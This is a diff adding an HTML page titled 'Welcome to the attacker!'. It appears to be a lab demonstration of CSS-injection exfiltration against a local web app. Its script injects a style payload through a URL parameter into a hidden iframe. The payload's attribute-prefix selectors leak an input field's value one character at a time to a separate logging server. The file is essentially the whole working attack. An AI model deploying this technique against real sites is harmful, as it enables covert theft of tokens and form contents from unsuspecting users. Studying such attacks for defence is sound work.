@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<!--    <title><%= title %></title>-->
+  </head>
+  <body>
+    <h1>Welcome to the attacker!</h1>
+    <p>Doing something evil</p>
+  </body>
+</html>
+
+<script>
+
+  window.onload = function() {
+    var currentstore = get("http://localhost:3002/test");
+    console.log("result: "+currentstore);
+    var currentPayload =
+            "<style>input[id=\"content\"][value^=\""+ currentstore +"0\"] {background:url(http://localhost:3002/log?message=0);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"1\"] {background:url(http://localhost:3002/log?message=1);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"2\"] {background:url(http://localhost:3002/log?message=2);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"3\"] {background:url(http://localhost:3002/log?message=3);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"4\"] {background:url(http://localhost:3002/log?message=4);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"5\"] {background:url(http://localhost:3002/log?message=5);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"6\"] {background:url(http://localhost:3002/log?message=6);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"7\"] {background:url(http://localhost:3002/log?message=7);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"8\"] {background:url(http://localhost:3002/log?message=8);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"9\"] {background:url(http://localhost:3002/log?message=9);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"a\"] {background:url(http://localhost:3002/log?message=a);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"b\"] {background:url(http://localhost:3002/log?message=b);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"c\"] {background:url(http://localhost:3002/log?message=c);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"d\"] {background:url(http://localhost:3002/log?message=d);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"e\"] {background:url(http://localhost:3002/log?message=e);}" +
+                   "input[id=\"content\"][value^=\""+ currentstore +"f\"] {background:url(http://localhost:3002/log?message=f);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"g\"] {background:url(http://localhost:3002/log?message=g);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"h\"] {background:url(http://localhost:3002/log?message=h);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"i\"] {background:url(http://localhost:3002/log?message=i);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"j\"] {background:url(http://localhost:3002/log?message=j);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"k\"] {background:url(http://localhost:3002/log?message=k);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"l\"] {background:url(http://localhost:3002/log?message=l);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"m\"] {background:url(http://localhost:3002/log?message=m);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"n\"] {background:url(http://localhost:3002/log?message=n);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"o\"] {background:url(http://localhost:3002/log?message=o);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"p\"] {background:url(http://localhost:3002/log?message=p);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"q\"] {background:url(http://localhost:3002/log?message=q);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"r\"] {background:url(http://localhost:3002/log?message=r);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"o\"] {background:url(http://localhost:3002/log?message=o);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"p\"] {background:url(http://localhost:3002/log?message=p);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"q\"] {background:url(http://localhost:3002/log?message=q);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"r\"] {background:url(http://localhost:3002/log?message=r);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"s\"] {background:url(http://localhost:3002/log?message=s);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"t\"] {background:url(http://localhost:3002/log?message=t);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"u\"] {background:url(http://localhost:3002/log?message=u);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"v\"] {background:url(http://localhost:3002/log?message=v);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"w\"] {background:url(http://localhost:3002/log?message=w);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"x\"] {background:url(http://localhost:3002/log?message=x);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"y\"] {background:url(http://localhost:3002/log?message=y);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"z\"] {background:url(http://localhost:3002/log?message=z);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"A\"] {background:url(http://localhost:3002/log?message=A);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"B\"] {background:url(http://localhost:3002/log?message=B);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"C\"] {background:url(http://localhost:3002/log?message=C);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"D\"] {background:url(http://localhost:3002/log?message=D);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"E\"] {background:url(http://localhost:3002/log?message=E);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"F\"] {background:url(http://localhost:3002/log?message=F);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"G\"] {background:url(http://localhost:3002/log?message=G);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"H\"] {background:url(http://localhost:3002/log?message=H);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"I\"] {background:url(http://localhost:3002/log?message=I);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"J\"] {background:url(http://localhost:3002/log?message=J);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"K\"] {background:url(http://localhost:3002/log?message=K);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"L\"] {background:url(http://localhost:3002/log?message=L);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"M\"] {background:url(http://localhost:3002/log?message=M);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"N\"] {background:url(http://localhost:3002/log?message=N);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"O\"] {background:url(http://localhost:3002/log?message=O);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"P\"] {background:url(http://localhost:3002/log?message=P);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"Q\"] {background:url(http://localhost:3002/log?message=Q);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"R\"] {background:url(http://localhost:3002/log?message=R);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"S\"] {background:url(http://localhost:3002/log?message=S);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"T\"] {background:url(http://localhost:3002/log?message=T);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"U\"] {background:url(http://localhost:3002/log?message=U);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"V\"] {background:url(http://localhost:3002/log?message=V);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"W\"] {background:url(http://localhost:3002/log?message=W);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"X\"] {background:url(http://localhost:3002/log?message=X);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"Y\"] {background:url(http://localhost:3002/log?message=Y);}" +
+                    "input[id=\"content\"][value^=\""+ currentstore +"Z\"] {background:url(http://localhost:3002/log?message=Z);}</style>";
+      createHiddenFrame(currentPayload);
+    }
+
+
+  function createHiddenFrame(url) {
+    var iframe = document.createElement("iframe");
+    iframe.src = "http://localhost:3000/home?username="+url;
+    iframe.style = "display: hidden";
+    iframe.height = "0";
+    iframe.width = "0";
+    iframe.frameborder = "0";
+    document.body.appendChild(iframe);
+    if (get("http://localhost:3002/test").length !== 16){
+      location.replace('/');
+    }
+  }
+
+  function get(url) {
+    var request = new XMLHttpRequest();
+    request.open("GET", url, false);
+    request.send();
+    return request.responseText;
+  }
+</script>
+
